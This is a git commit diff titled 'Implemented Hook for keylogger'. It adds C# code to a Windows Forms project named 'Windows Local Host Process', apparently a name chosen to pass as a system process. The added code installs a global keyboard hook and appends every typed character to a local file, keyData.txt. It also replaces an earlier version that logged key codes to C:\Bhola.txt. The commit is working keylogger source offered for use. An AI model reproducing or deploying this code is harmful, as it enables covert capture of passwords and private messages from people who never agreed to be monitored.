951f188173b198649494fdffacc765b2e695cd16
xkre <arekram@live.com>
2017-10-20 20:44:49 +0800

    Implemented Hook for keylogger

--- Windows Local Host Process/Form1.cs
+++ Windows Local Host Process/Form1.cs
@@ -9,22 +9,41 @@ using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using System.IO;
+using Keystroke.API;
 
 namespace Windows_Local_Host_Process
 {
     public partial class Form1 : Form
     {
+        private KeystrokeAPI _keystrokeApi;
+        private StreamWriter _sw;
+
         public Form1()
         {
             InitializeComponent();
+            InitKeylogger();
         }
         private void Form1_KeyUp(object sender, KeyEventArgs e)
         {
-            //ListBox list1 = new ListBox();
-            //list1.Items.Add(e.KeyCode);
-            StreamWriter sw = new StreamWriter(@"C:\Bhola.txt", true);
-            sw.Write(e.KeyCode);
-            sw.Close();
+            //Removed...
         }
+
+        private void InitKeylogger()
+        {
+            _keystrokeApi = new KeystrokeAPI();
+            _sw = new StreamWriter(@"keyData.txt", true);
+
+            //Create a hook that write to file when key is pressed
+            _keystrokeApi.CreateKeyboardHook((character) => {
+                _sw.Write(character);
+                _sw.Flush();
+            });
+        }
+
+        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            _keystrokeApi.Dispose();
+            _sw.Close();
+		}
     }
 }
